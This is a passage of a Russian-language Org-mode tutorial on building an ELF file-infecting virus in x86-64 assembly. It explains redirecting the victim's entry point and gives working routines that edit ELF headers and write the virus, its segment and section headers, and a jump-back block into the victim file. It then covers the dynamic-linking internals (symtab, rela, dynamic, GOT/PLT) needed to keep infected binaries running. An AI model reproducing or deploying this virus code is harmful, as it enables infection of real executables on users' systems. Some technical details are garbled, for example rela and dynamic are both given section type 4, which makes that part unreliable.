      jmp     _shdr_offset_and_addr_recount_exit

  _shdr_offset_and_addr_recount_fail:
      mov      $-1, %rax

  _shdr_offset_and_addr_recount_exit:
      pop      %rsi
      pop      %rdi
      pop      %r8
      pop      %rcx
      pop      %rdx
      pop      %rbx
      ret

#+END_SRC

** TODO Передать управление на жертву

 - После завершения вируса правильно передать управление коду мишени -
    для этого будем ипользовать опкод ~jmp~ с относительным или
    абсолютным адресом. Понадобится:
    - Посчитать, на каком адресе инструкции будет находиться вирус, когда
      будет передавать управление на оригинальную точку входа мишени. Для
      этого берем виртуальный адрес вируса, который мы высчитывали выше,
      берем размер кода вируса и складываем их. А затем прибавляем к
      полученному адресу еще 5 байт - смещение высчитывается от следующей
      за переходом инструкции.
    - Оригинальную точку входа мишени берем из поля ~e_entry~ до его
      модификации
    - Теперь вычитаем из оригинальной e_entry полученный адрес инструкции
      и получаем таким образом смещение до оригинальной точки входа.
    - Пример: адрес вашего вируса 0x8012a8, его размер 0x100 байт, адрес
      оригинальной точки входа 0x400430.  0x400430 - (0x8012a8 + 0x100 +
      0x5) = -400f7d.  Смещение получается отрицательным, поскольку мы
      совершаем прыжок не "вперед", а "назад".

** Отредактировать заголовок ELF-a

В заголовке ELF-a нам нужно отредактировать поля:
- ~e_phnum~ - оно увеличится на единицу, поскольку заголовков
  сегментов стало на 1 больше
- ~e_shnum~ - оно увеличится на единицу, поскольку количество заголовков
  секций тоже увеличилось
- ~e_shoff~ - поскольку мы вписываем вирус, то заголовки секций сместятся
  на его размер. Новое смещение высчитывается как старое смещение +
  размер вируса
- ~e_entry~ - нужно указать новую точку входа. Теперь это будет
  виртуальный код вируса.

[TODO:gmm] Здесь с кодом та же проблема, что и везде: в нем функционал,
смысл которого еще не описывался.

Посмотрим на реализацию этого редактирования.

#+NAME: _edit_elf_hdr
#+BEGIN_SRC asm

  /// _EDIT_ELF_HDR
  /// Редактирует заголовок эльфа
  /// и сохраняет его оргинальный e_entry
  _edit_elf_hdr:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      mov     virus_code_size(%rip), %rsi
      test    %rsi, %rsi
      je      _edit_elf_hdr_fail

      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _edit_elf_hdr_fail

      mov     virus_new_vaddr(%rip), %rdx
      test    %rdx, %rdx
      je      _edit_elf_hdr_fail

      mov     data_size(%rip), %rcx
      mov     new_bind_now_flag_record_size(%rip), %rdx

      add     %rcx, %rsi  # + размер блока данных
      add     $0x38, %rsi # + размер вставляемого заголовка
      add     %rdx, %rsi  # + размер вставляемой записи dynamic

      add     $0x18, %rdi     # смещение до e_entry

      mov     (%rdi), %rcx
      mov     %rcx, original_e_entry(%rip) # save original e_entry

      mov     virus_new_vaddr(%rip), %rdx
      mov     %rdx, (%rdi)  # new e_entry

      add     $0x10, %rdi   # смещение до e_shoff
      add     %rsi, (%rdi)

      add     $0x10, %rdi   # смещение до e_phnum
      add     $0x1, (%rdi)

      add     $0x4, %rdi    # смещение до e_shnum
      add     $0x1, (%rdi)

  _edit_elf_hdr_success:
      xor     %rax, %rax
      jmp     _edit_elf_hdr_exit

  _edit_elf_hdr_fail:
      mov     $-1, %rax

  _edit_elf_hdr_exit:
      pop    %rsi
      pop    %rdi
      pop    %rdx
      pop    %rcx
      ret

#+END_SRC

** Записать ELF-файл на диск

Записываем в следующей последовательности:
  - Код от начала файла до конца таблицы заголовков сегментов
  - Заголовок сегмента вируса
  - Весь код мишени до начала таблицы секций
  - Весь код вируса
  - Код, передающий управление на мишень
  - Таблицу секций мишени
  - Заголовок секции вируса

Поскольку файл приходится записывать по скускам, а не единым вызовом, то
нам нужено каким-то образом не начинать запись файла каждый раз с его
начала. Самое простое - это воспользоваться системным вызовом ~pwrite~,
которому можно задать смещение в файле, с которого он должен писать.

Для каждого вызова ~pwrite~ понадобится:
- файловый дескриптор файла, в который ведется запись
- указатель на код, который записывается
- рамер этого кода
- смещение в файле, с которого начинается запись

Под смещение мы заведем переменную ~file_offset~, которая по умолчанию
будет 0. Каждый раз записывая какой-то блок кода, мы будем складывать его
размер со значением, которое находится в переменной, высчитывая таким
образом смещение для следующего блока в файле.

В блоках ниже вы можете видеть реализацию необходимого функционала.

*** Сначала запишем код от начала файла до конца таблицы секций

#+NAME: _write_till_phdr_table_end
#+BEGIN_SRC asm

  /// _WRITE_TILL_PHDR_TABLE_END
  /// Вписывает в файл жертву от ее начала до
  /// конца таблицы заголовков сегментов
  _write_till_phdr_table_end:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     victim_elf_addr(%rip), %rsi
      mov     victim_phdr_table_size(%rip), %rdx
      add     $0x40, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_till_phdr_table_end_fail

  _write_till_phdr_table_end_success:
      xor     %rax, %rax
      jmp     _write_till_phdr_table_end_exit

  _write_till_phdr_table_end_fail:
      mov     $-1, %rax

  _write_till_phdr_table_end_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Теперь вписываем заголовок вируса

#+NAME: _write_new_phdr_virus
#+BEGIN_SRC asm

  /// _WRITE_NEW_PHDR_VIRUS
  /// Вписывает новый заголовок в жертву
  _write_new_phdr_virus:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    virus_new_phdr(%rip), %rsi
      mov     $0x38, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_new_phdr_virus_fail

  _write_new_phdr_virus_success:
      xor     %rax, %rax
      jmp     _write_new_phdr_virus_exit

  _write_new_phdr_virus_fail:
      mov     $-1, %rax

  _write_new_phdr_virus_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Впишем весь код мишени до заголовков секций

#+NAME: _write_whole_victim
#+BEGIN_SRC asm

  /// _WRITE_WHOLE_VICTIM
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_whole_victim:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     new_bind_now_flag_record_size(%rip), %rdi
      test    %rdi, %rdi
      jne     _write_whole_victim_fail

      mov     interm_fd_file(%rip), %rdi
      mov     victim_code_addr(%rip), %rsi
      mov     victim_code_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_whole_victim_fail

  _write_whole_victim_success:
      xor     %rax, %rax
      jmp     _write_whole_victim_exit

  _write_whole_victim_fail:
      mov     $-1, %rax

  _write_whole_victim_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Вписываем вирус

#+NAME: _write_virus_code
#+BEGIN_SRC asm

  /// _WRITE_WHOLE_VICTIM
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_virus_code:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     virus_code_addr(%rip), %rsi
      mov     virus_code_size(%rip), %rdx

      mov     transfer_control_code_size(%rip), %rax
      sub     %rax, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_virus_code_fail

  _write_virus_code_success:
      xor     %rax, %rax
      jmp     _write_virus_code_exit

  _write_virus_code_fail:
      mov     $-1, %rax

  _write_virus_code_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Блок передачи управления

#+NAME: _write_transfer_control_code_block
#+BEGIN_SRC asm

  /// _WRITE_TRANSFER_CONTROL_CODE_BLOCK
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_transfer_control_code_block:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    transfer_control_code(%rip), %rsi
      mov     transfer_control_code_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_transfer_control_code_block_fail

  _write_transfer_control_code_block_success:
      xor     %rax, %rax
      jmp     _write_transfer_control_code_block_exit

  _write_transfer_control_code_block_fail:
      mov     $-1, %rax

  _write_transfer_control_code_block_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Записываем заголовки секций мишени

#+NAME: _write_victim_shdrs
#+BEGIN_SRC asm
  /// _WRITE_VICTIM_SHDRS
  ///  Пишет таблицу заголовков секций
  _write_victim_shdrs:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     victim_shdr_table_addr(%rip), %rsi
      mov     victim_shdr_table_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_data_block_fail

  _write_victim_shdrs_success:
      xor     %rax, %rax
      jmp     _write_victim_shdrs_exit

  _write_victim_shdrs_fail:
      mov     $-1, %rax

  _write_victim_shdrs_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Наконец вписываем заголовок секции вируса

#+NAME: _write_virus_new_shdr
#+BEGIN_SRC asm

  /// _WRITE_VICTIM_SHDRS
  ///  Пишет таблицу заголовков секций
  _write_virus_new_shdr:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    virus_new_shdr(%rip), %rsi
      mov     $0x40, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_virus_new_shdr_fail

  _write_virus_new_shdr_success:
      xor     %rax, %rax
      jmp     _write_virus_new_shdr_exit

  _write_virus_new_shdr_fail:
      mov     $-1, %rax

  _write_virus_new_shdr_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

** Теперь наш инфицированный ELF выглядит следующим образом:

#+NAME: infected_elf2
#+BEGIN_SRC ditaa :file ./img/infected_elf2.png
         +----------------------------+
         | Заголовок ELF-файла        |
         | (ELF-header)               |
         |   ...                      |
         | e_entry                    |----+
         |   ...                      |    |
         +----------------------------+    |
                                           |
         +----------------------------+    |
         |Таблица заголовков сегментов|    |
         |(Program Header Table)      |    |
         +----------------------------+    |
         | PHDR                       |    |
         | INTERP                     |    |
         | ..(остальные заголовки)..  |    |
         | LOAD RE (заголовок вируса) |    |
         +----------------------------+    |
                                           |
         +----------------------------+    |
         | Segment (PHDR)             |    |
         +----------------------------+    |
         | Segment (INTERP)           |    |
         |    .interp                 |    |
         +----------------------------+    |
         | Segment (LOAD) R           |    |
         |    .interp                 |    |
         |      ...                   |    |
         +----------------------------+    |
         | Segment (LOAD) RE          |    |
         |    .text                   |    |
         |      ...                   |    |
   +---->| OEP:                       |    |
   |     |      ...                   |    |
   |     +----------------------------+    |
   |     | Segment (LOAD) R           |    |
   |     |      ...                   |    |
   |     +----------------------------+    |
   |     | Segment (LOAD) RW          |    |
   |     |      ...                   |    |
   |     +----------------------------+    |
   |     | Segment (DYNAMIC) RW       |    |
   |     |   .dynamic                 |    |
   |     +----------------------------+    |
   |     | Segment (NOTE)             |    |
   |     |     ...                    |    |
   |     +----------------------------+    |
   |     | Segment (GNU_...)          |    |
   |     |     ...                    |    |
   |     +----------------------------+    |
   |     | Segment (LOAD) RE VIRUS    |<---+
   |     |    .text                   |
   |     |      ...                   |
   +----<|      jmp OEP               |
         +----------------------------+

         +----------------------------+
         | Таблица заголовков секций  |
         | (Section Header Table)     |
         +----------------------------+
         | Null Section Header        |
         | .interp                    |
         | ... (иные секции мишени)   |
         | .text (секция кода мишени  |
         | ... (иные секции мишени)   |
         | .virus (секция вируса)     |
         +----------------------------+
#+END_SRC

#+results: infected_elf2
[[file:./img/infected_elf2.png]]


* Немного о линковке

Вроде бы все сделано верно, но при запуске инфицированного ELF-файла, мы
получаем сегфолт. Чтоб понять причины этого, нужно детально разобраться в
том, как происходит процесс динамической линковки.

Помимо секций кода и данных в каждом ELF-файле есть таблица символов,
которая содержит в себе информацию о символах программы. В динамически
слинкованном ELF-е таблиц символов может быть максимум две - symtab и
dynsym. Dynsym содержит в себе информацию о динамических символах
программы - т.е. о символах, заимствованных из библиотек, а symtab хранит
в себе информацию обо всех символах вообще: имя символа, его виртуальный
адрес, тип связязывания, видимость в файле и т.д. После компиляции в этой
таблице можно увидеть связь символа и адрес, на который он
ссылается. Именно такую таблицу проверяет рантайм-линкер, когда ищет,
например, код printf в библиотеке, чтоб вернуть нам адрес на него.

Для корректной работы помимо symtab линкеру необходимы секции .rela и
.dynamic.

Секция dynamic хранит в себе всю информацию, которая может понадобиться
линкеру и libc для корректного старта и завершения программы.

~libc~ нужены записи init, fini, init_array и fini_array. Линкеру нужно
все остальное.

Здесь вы можете видеть уже знакомые нам pltgot и symtab, а так же
упомянутую секцию rela.

#+BEGIN_SRC sh
  $readelf -r hello

  Dynamic section at offset 0xe60 contains 25 entries:
    Тег        Тип                          Имя/Знач
   0x0000000000000001 (NEEDED)             Совм. исп. библиотека: [libc.so.6]
   0x000000000000000c (INIT)               0x4004e0
   0x000000000000000d (FINI)               0x40074c
   0x0000000000000019 (INIT_ARRAY)         0x600e48
   0x000000000000001b (INIT_ARRAYSZ)       8 (байт)
   0x000000000000001a (FINI_ARRAY)         0x600e50
   0x000000000000001c (FINI_ARRAYSZ)       8 (байт)
   0x000000006ffffef5 (GNU_HASH)           0x4002d0
   0x0000000000000005 (STRTAB)             0x4003b0
   0x0000000000000006 (SYMTAB)             0x4002f0
   0x000000000000000a (STRSZ)              86 (байт)
   0x000000000000000b (SYMENT)             24 (байт)
   0x0000000000000015 (DEBUG)              0x0
   0x0000000000000003 (PLTGOT)             0x601048
   0x0000000000000002 (PLTRELSZ)           144 (байт)
   0x0000000000000014 (PLTREL)             RELA
   0x0000000000000017 (JMPREL)             0x400450
   0x0000000000000007 (RELA)               0x400438
   0x0000000000000008 (RELASZ)             24 (байт)
   0x0000000000000009 (RELAENT)            24 (байт)
   0x000000006ffffffe (VERNEED)            0x400418
   0x000000006fffffff (VERNEEDNUM)         1
   0x000000006ffffff0 (VERSYM)             0x400406
   0x0000000000000018 (BIND_NOW)
   0x0000000000000000 (NULL)               0x0
#+END_SRC

Секция rela содержит в себе информацию о релокейтах: их имена,
адреса, как именно должна выполниться релокация и т.д.

#+BEGIN_SRC sh
  $ readelf -r hello

  Раздел перемещения '.rela.dyn' со смещением 0x438 содержит 1 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601040  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

  Раздел перемещения '.rela.plt' со смещением 0x450 содержит 6 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601060  000100000007 R_X86_64_JUMP_SLO 0000000000000000 localtime@GLIBC_2.2.5 + 0
  000000601068  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
  000000601070  000300000007 R_X86_64_JUMP_SLO 0000000000000000 asctime@GLIBC_2.2.5 + 0
  000000601078  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
  000000601080  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
  000000601088  000700000007 R_X86_64_JUMP_SLO 0000000000000000 time@GLIBC_2.2.5 + 0
#+END_SRC

Из всех этапов компиляции нас интересует только два: кодогенерация и
линковка. На этапе кодогенерации генерируется весь код и проверяется
наличие определения (объекта) для всех используемых символов. Определения
могут находиться и за пределами текущего файла, и тогда мы будем их
искать в указанных библиотеках с помощью таблицы символов в них.  Если же
не найдем и там, то компиляция не завершится.

На выходе из этого этапа мы получаем объектный файл. Распечатав такой файл с
помощью objdump-a мы видим, что в нем не хватает секции plt и got,
dynamic и многих других. Это происходит, потому что заключительного этапа
компиляции - линковки - еще не было.

Давайте взглянем на таблицу символов

#+BEGIN_SRC sh
    $ readelf -s hello.o

  Таблица символов «.symtab» содержит 17 элементов:
     Чис:    Знач           Разм Тип     Связ   Vis      Индекс имени
       0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
       1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.c
       2: 0000000000000000     0 SECTION LOCAL  DEFAULT    1
       3: 0000000000000000     0 SECTION LOCAL  DEFAULT    3
       4: 0000000000000000     0 SECTION LOCAL  DEFAULT    4
       5: 0000000000000000     0 SECTION LOCAL  DEFAULT    5
       6: 0000000000000000     0 SECTION LOCAL  DEFAULT    7
       7: 0000000000000000     0 SECTION LOCAL  DEFAULT    8
       8: 0000000000000000     0 SECTION LOCAL  DEFAULT    6
       9: 0000000000000008     8 OBJECT  GLOBAL DEFAULT  COM rawtime
      10: 0000000000000008     8 OBJECT  GLOBAL DEFAULT  COM timeinfo
      11: 0000000000000000    81 FUNC    GLOBAL DEFAULT    1 main
      12: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND puts
      13: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND time
      14: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND localtime
      15: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND asctime
      16: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND printf
#+END_SRC

Во-первых, она очень короткая, потому что многие символы еще не
подклчены. А во вторых, в поле "значение", в котором должен находиться
адрес символа или его смещение в файле, пусто. Линковки еще не было,
поэтому ссылки на символы все еще не заполнены.

А теперь  посмотрим на секции rela.

#+BEGIN_SRC sh
  $ readelf -r hello.o

  Раздел перемещения '.rela.text' со смещением 0x310 содержит 11 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000000005  00050000000a R_X86_64_32       0000000000000000 .rodata + 0
  00000000000a  000c00000002 R_X86_64_PC32     0000000000000000 puts - 4
  00000000000f  00090000000a R_X86_64_32       0000000000000008 rawtime + 0
  000000000014  000d00000002 R_X86_64_PC32     0000000000000000 time - 4
  000000000019  00090000000a R_X86_64_32       0000000000000008 rawtime + 0
  00000000001e  000e00000002 R_X86_64_PC32     0000000000000000 localtime - 4
  000000000025  000a00000002 R_X86_64_PC32     0000000000000008 timeinfo - 4
  00000000002c  000a00000002 R_X86_64_PC32     0000000000000008 timeinfo - 4
  000000000034  000f00000002 R_X86_64_PC32     0000000000000000 asctime - 4
  00000000003c  00050000000a R_X86_64_32       0000000000000000 .rodata + 10
  000000000046  001000000002 R_X86_64_PC32     0000000000000000 printf - 4

  Раздел перемещения '.rela.eh_frame' со смещением 0x418 содержит 1 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000000020  000200000002 R_X86_64_PC32     0000000000000000 .text + 0
#+END_SRC

Поле "смещение" действительно указывает на смещение в файле, а не на
виртуальный адрес, куда мы положим новый адрес релокейта.

Что ж, завершим нашу компиляцию, превратив объектный файл в
исполняемый. На этом этапе включается линкер, который должен заполнить
все ссылки, какие сможет. Но есть ссылки, которые он заполнить не
сможет. Это происходит, потому что на этом этапе линкер не имеет никакого
представления о том, куда будут загружены библиотеки, и потому оставляет
эти ссылки нетронутыми до исполнения программы, где уже включится
известным нам механизм ленивого связывания, которое осуществляется с
помощью PLT и GOT.

Благодаря им и магии виртуальной памяти мы можем загрузить библиотеку
один раз и разделить ее между несколькими программами, и для каждой она
будет как будто лежать по разным адресам.

Но так было далеко не всегда. Когда PLT и GOT не было, процесс выглядел
по-другому. Помимо того, что для каждого процесса приходилось отдельно
подгружать библиотеку, отличался процесс линковки.
На этапе компиляции линкер предполагал, что библиотеки будут размещены
примерно сразу за стеком и вписывал смещение от текущей инструкции до
предполагаемого адреса кода библиотеки, который был нужен. А затем
рантайм линкер во время исполнения программы получал базовый адрес
загруженной библиотеки и складывал этот адрес с посчитанным ранее
смещением и таким образом вызывался необходимый код.

Именно из-за этого процесса релокейты так называются. Фактически у нас
есть символ и есть ссылка на его объект - определение. До исполнения программы
ссылка указывает в одно место, а во время исполнения начинает указывать в
другое место. Т.е. мы перемещаем саму ссылку на объект.

Теперь же мы используем PLT и GOT. Посмотрите на виртуальные адреса
релокейтов в секциях rela.

#+BEGIN_SRC sh
  $ readelf -r hello

  Раздел перемещения '.rela.dyn' со смещением 0x438 содержит 1 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601040  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

  Раздел перемещения '.rela.plt' со смещением 0x450 содержит 6 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601060  000100000007 R_X86_64_JUMP_SLO 0000000000000000 localtime@GLIBC_2.2.5 + 0
  000000601068  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
  000000601070  000300000007 R_X86_64_JUMP_SLO 0000000000000000 asctime@GLIBC_2.2.5 + 0
  000000601078  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
  000000601080  000500000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
  000000601088  000700000007 R_X86_64_JUMP_SLO 0000000000000000 time@GLIBC_2.2.5 + 0
#+END_SRC

И взгляните, на какие именно записи в GOT прыгает PLT.

#+BEGIN_SRC sh
  0000000000400508 <localtime@plt-0x10>:
    400508:	ff 35 32 0b 20 00    	pushq  0x200b32(%rip)        # 601040 <_DYNAMIC+0x1e0>
    40050e:	ff 25 34 0b 20 00    	jmpq   *0x200b34(%rip)        # 601048 <_GLOBAL_OFFSET_TABLE_>
    400514:	0f 1f 40 00          	nopl   0x0(%rax)

  0000000000400518 <localtime@plt>:
    400518:	ff 25 32 0b 20 00    	jmpq   *0x200b32(%rip)        # 601050 <_GLOBAL_OFFSET_TABLE_+0x8>
    40051e:	68 00 00 00 00       	pushq  $0x0
    400523:	e9 e0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400528 <puts@plt>:
    400528:	ff 25 2a 0b 20 00    	jmpq   *0x200b2a(%rip)        # 601058 <_GLOBAL_OFFSET_TABLE_+0x10>
    40052e:	68 01 00 00 00       	pushq  $0x1
    400533:	e9 d0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400538 <asctime@plt>:
    400538:	ff 25 22 0b 20 00    	jmpq   *0x200b22(%rip)        # 601060 <_GLOBAL_OFFSET_TABLE_+0x18>
    40053e:	68 02 00 00 00       	pushq  $0x2
    400543:	e9 c0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400548 <printf@plt>:
    400548:	ff 25 1a 0b 20 00    	jmpq   *0x200b1a(%rip)        # 601068 <_GLOBAL_OFFSET_TABLE_+0x20>
    40054e:	68 03 00 00 00       	pushq  $0x3
    400553:	e9 b0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400558 <__libc_start_main@plt>:
    400558:	ff 25 12 0b 20 00    	jmpq   *0x200b12(%rip)        # 601070 <_GLOBAL_OFFSET_TABLE_+0x28>
    40055e:	68 04 00 00 00       	pushq  $0x4
    400563:	e9 a0 ff ff ff       	jmpq   400508 <_init+0x28>

  0000000000400568 <time@plt>:
    400568:	ff 25 0a 0b 20 00    	jmpq   *0x200b0a(%rip)        # 601078 <_GLOBAL_OFFSET_TABLE_+0x30>
    40056e:	68 05 00 00 00       	pushq  $0x5
    400573:	e9 90 ff ff ff       	jmpq   400508 <_init+0x28>
#+END_SRC

Эти адреса совпадают с виртуальными адресами релокейтов из секций
rela. Суть механизма осталась прежней, просто PLT и GOT позволяют
оптимизировать подкгрузку библиотек.

Сначала ссылки на релокейты  содержат в себе адрес кода в PLT, который
вызовет линкер, а после рантайм линковки будут содержать в себе адрес,
по которому лежит библиотечный код.

Но как в деталях происходит этот процесс?

Теперь, когда мы скомпилировали файл, мы можем его запустить и проследить
весь путь работы линкера.

Загружая файл, загрузчик должен какм-то образом понять, какие библиотеки
ему загружать. Но вся фишка в том, что все, что он загружает - это сам
файл и линкер, чье имя оказано в сегмента INTERP. Затем управление
переходит на линкер, и вот он уже осуществляет всю работу по подгрузке
библиотек.

Первым делом линкер отправляется в секцию dynamic и ищет в ней записи,
помеченные как NEEDED. Эти записи содержат в себе имена библиотек, от
которых зависят все прочие библиотеки. Они будут загружены в первую
очередь.

После этого линкер отправляется в strtab - таблицу строк - и считывает
оттуда пути, по которым ищет остальные библиотеки. Найдя их, линкер
загружает их в память.

Следующий этап - это связывание библиотек друг с другом. Происходит это
рекурсивно: линкер заходит в секцию dynamic каждой библиотеки и ищет в
ней запись NEEDED. Если такая запись есть, то линкер отправляется в
библиотеку, указанную в этой записи, читает ее секцию dynamic и т.д. Это
продолжается до тех пор, пока не будет найдены библиотеки, не зависящие
от прочих. Линкер разрешит все ссылки сначала в них, а затем, откатываясь
назад по дереву рекурсии, будет разрешать ссылки в прочих библиотеках.

Линкер знает, что скорее всего его вызовут еще n раз, а еще знает, что скорее
всего будет вызвана libc, которой нужен доступ к некоторым секциям
жертвы, вроже секций fini или init, информация о которых хранится в
любимой нами секции dynamic. Но вот обращаться напрямую к записям
dynamic повторно линкер не хочет, да и libc это незачем.

Поэтому после того, как линкер свяжет все библиотеки друг с другом, он
создает в памяти буфер и сохраняет адреса необходимых ему и libc
записей dynamic - т.е. где эти записи расположены в памяти
процесса. Это позволит ему и libc обращаться к конкретным записям
dynamic, а не прочесывать ее всю каждый раз. Адрес этого буфера будет
положен в одну и записей GOT, а в другую запись линкер положит свой
собственный адрес, чтоб мы могли вызвать его из PLT. После чего
управление переходит на саму программу.

Внутри программы, когда мы натыкаемся на первый вызов какой-то
библиотечной функции, PLT вызывает линкер снова. Линкер читает имя
символа, который должен быть связан, а затем читает записьиз секции rela,
в которой описано, как именно должен быть связан этот символ. Затем
отправляется в библиотеку, где лежит этот символ, и просматривает ее
таблицу символов. Если символ найден, то линкер считывает смещение, по
которому лежит определение этого символа в библиотеке, складвает его с
базовым адресом и полученный адрес вписывает в запись GOT, которая
ассоциирована с этим символом. Именно так выполняется процесс релокации,
описанный выше. После этого линкер возвращает управление нашей программе.

Теперь, когда мы понимаем этот сложный процесс в деталях, нам становится
очевидно, почему инфицированный ELF работает некорректно.
Добавив новый заголовок, мы сместили весь код мишени на 56 байт. Но
проблема в том, что секции symtab, rela, dynamic и got, чьеи записи
содержат адрес кода в PLT, вызывающего линкер, ничего об этом не
знают. Адреса и смещения, записанные в их записях, больше
неактуальны. Поэтому линкер получается совершенно не ту информацию, на
которую рассчитывает.

Чтобы это исправить, нужно отредактировать каждую запись в этих трех
секциях, увеличив смещение и/или адрес, записанные в них, на размер
заголовока сегмента вируса.

* Редактируем got, symtab, rela и dynamic

Секции symtab, rela и dynamic достаточно просто найти.
У нас есть таблица заголовков секций. В каждом заголовке секции есть поле
sh_type, которое обозначает, секцию какого типа описывает этот заголовок. Не у каждой
секции есть свой специфический тип, но у rela, symtab и dynamic этот типа
есть. Секции rela имеют тип 4, секция symtab - тип 2, секция dynamic -
тип 4. Найдя заголовок интересущей вас секции, считайте ее смещение от
начала файла, а затем сложите это смещение с базовым адресом вашей
загруженной в память мишени. Так вы найдете, где секции располагаются в
памяти.

Поскольку записи в этих секциях фиксированного размера, то вы можете
просто сдвигать указатель на определенное количество байт и таким образом
редактировать нужные вам поля.

С секцией got чуть сложнее. Она имеет тип 1, а с этим типом есть
множество секций. Но есть секция, которая которая ссылкается на секцию
got - это секция dynamic, как мы знаем. Запись о секции got имеет тип 3 в
секции dynamic и этот тип уникален. Поскольку мы теперь знаем, где
находится dynamic в памяти, мы можем пройтись по ней и найти запись о
секции got. Затем мы считаем оттуда виртуальный адрес этой секции и уже
по нему найдем ее заголовок в таблице заголовков секций. Далее считаем
смещение, сложим его с базовым адресом эльфа и получим адрес секции got в
памяти. А дальше можем отредактировать записи в ней как в прочих
секциях.

Если так вышло, что у вас нет заголовков секций вообще, то вы можете
сначала найти секцию dynamic по заголовку ее сегмента. Вы вычислите адрес
секции dynamic уже указанным способом и считаете оттуда записи секции
rela, symtab и got и получаете адреса этих сегментов. Затем вы берете
виртуальный адрес первого сегмента и вычитаете его из каждого полученного
виртуального адреса. Так вы получите смещение в файле для rela и symtab,
затем сложите их с базовым адресом ELF-a и получите адреса секций в
памяти.

Но вычислить таким образом адрес got не удастся. Дело в том, что при
